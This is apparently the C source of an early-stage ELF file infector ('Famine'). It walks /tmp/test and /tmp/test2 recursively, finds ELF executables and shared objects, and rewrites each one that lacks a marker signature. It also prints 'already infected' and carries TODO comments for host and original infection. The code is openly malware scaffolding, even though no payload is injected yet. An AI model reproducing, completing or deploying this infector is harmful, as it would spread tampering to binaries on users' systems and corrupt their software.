#include "famine.h"

void	try_open_file(t_elf *host_elf, char *file)
{
	int				ret;
	int				fd;
	t_elf			elf;
	void			*header[64];

	fd = open(file, O_RDWR);
	if (fd > 0)
	{
		ret = read(fd, header, 64);
		if (ret >= 0)
		{
			ret = check_magic_elf(header);
			if (ret == ET_EXEC || ret == ET_DYN)
			{
				ret = 0;
				elf.filename = file;
				elf.size = lseek(fd, (size_t)0, SEEK_END);
				if (elf.size < 0 ||
(elf.addr = mmap(NULL, elf.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
				{
					close(fd);
					if (DEBUG)
						debug_print_error(0, host_elf->filename, file);
					return ;
				}
				if (!memmem(elf.addr, elf.size, SIGNATURE, strlen(SIGNATURE)))
				{
					if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
					{
						munmap(elf.addr, elf.size);
						close(fd);
						if (DEBUG)
							debug_print_error(ret, host_elf->filename, file);
						return ;
					}
					char	*new = malloc(elf.size + strlen(SIGNATURE));
					if (!new)
					{
						munmap(elf.addr, elf.size);
						close(fd);
						if (DEBUG)
							debug_print_error(ret, host_elf->filename, file);
						return ;
					}
					char	*ptr = new;
					memcpy(ptr, elf.addr, elf.size);
					memcpy(ptr + elf.size, SIGNATURE, strlen(SIGNATURE));
					//
					munmap(elf.addr, elf.size);
					close(fd);
					fd = open(file, O_TRUNC | O_RDWR);
					if (fd < 0)
						return ;
					write(fd, new, elf.size + strlen(SIGNATURE));
				}
				else
					printf("%s already infected.\n", file);
			}
		}
		else if (DEBUG)
			debug_print_error(ret, host_elf->filename, file);
		close(fd);
	}
}

void	moving_through_path(t_elf *host_elf, char *path)
{
	DIR		*dir;
    struct	dirent *d;
	int		size;
	char	*new_path;

	dir = opendir(path);
	if (dir)
	{
		while ((d = readdir(dir)))
		{
			if (strcmp(d->d_name, ".") && strcmp(d->d_name, ".."))
			{
				size = strlen(path) + strlen(d->d_name) + 2;
				new_path = malloc(size);
				bzero(new_path, size);
				strcpy(new_path, path);
				strcat(new_path, "/");
				strcat(new_path, d->d_name);
				if (d->d_type == DT_DIR)
					moving_through_path(host_elf, new_path);
				else
					try_open_file(host_elf, new_path);
				free(new_path);
			}
		}
		closedir(dir);
	}
	else if (DEBUG)
		debug_print_error(0, host_elf->filename, path);
}

int		main(int argc, char *argv[])
{
	int		fd;
	int		ret;
	t_elf	elf;

	ret = 0;
	if (DEBUG)
		debug_print_args(argc, argv);
	fd = open(argv[0], O_RDONLY);
	if (fd > 0)
	{
		/* TODO: Original infection
			Copy the whole file
		*/
		// TODO: Host infection
		elf.filename = argv[0];
		elf.size = lseek(fd, (size_t)0, SEEK_END);
		if (elf.size < 0 ||
(elf.addr = mmap(NULL, elf.size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		{
			close(fd);
			if (DEBUG)
				debug_print_error(0, argv[0], argv[0]);
			return (1);
		}
		if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
		{
			munmap(elf.addr, elf.size);;
			close(fd);
			if (DEBUG)
				debug_print_error(0, argv[0], argv[0]);
			return (1);
		}
		moving_through_path(&elf, "/tmp/test");
		moving_through_path(&elf, "/tmp/test2");
		munmap(elf.addr, elf.size);
		close(fd);
	}
	else if (DEBUG)
		debug_print_error(0, argv[0], argv[0]);
	return (0);
}
